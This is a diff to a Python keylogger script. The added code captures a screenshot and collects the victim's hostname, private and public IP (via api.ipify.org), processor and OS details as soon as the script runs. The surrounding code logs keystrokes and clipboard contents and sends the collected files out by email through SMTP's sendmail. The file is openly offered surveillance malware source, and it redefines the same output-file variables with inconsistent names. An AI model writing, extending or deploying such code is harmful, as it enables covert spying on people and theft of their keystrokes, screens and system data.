@@ -26,16 +26,41 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
+system_information= "systeminfo.txt"
+screenshot_information= "screenshots.png"
 system_information = "syseminfo.txt"
 clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
 
+
 file_path = os.getcwd()
 extend="\\"
 
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path+extend+screenshot_information )
+screenshot()
+
+def computer_information():
+    with open(file_path+extend+system_information,"a") as f:
+        hostname = socket.gethostname()
+        IPaddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip)
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPaddr + "\n")
+computer_information()
+ 
+
 count = 0
 keys=[]
-
 def on_press(key):
     global keys,count
     print(key)
@@ -87,12 +112,6 @@ def send_email(filename, attachment, toaddr):
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
-
-
-
-
-
-
 
 
 
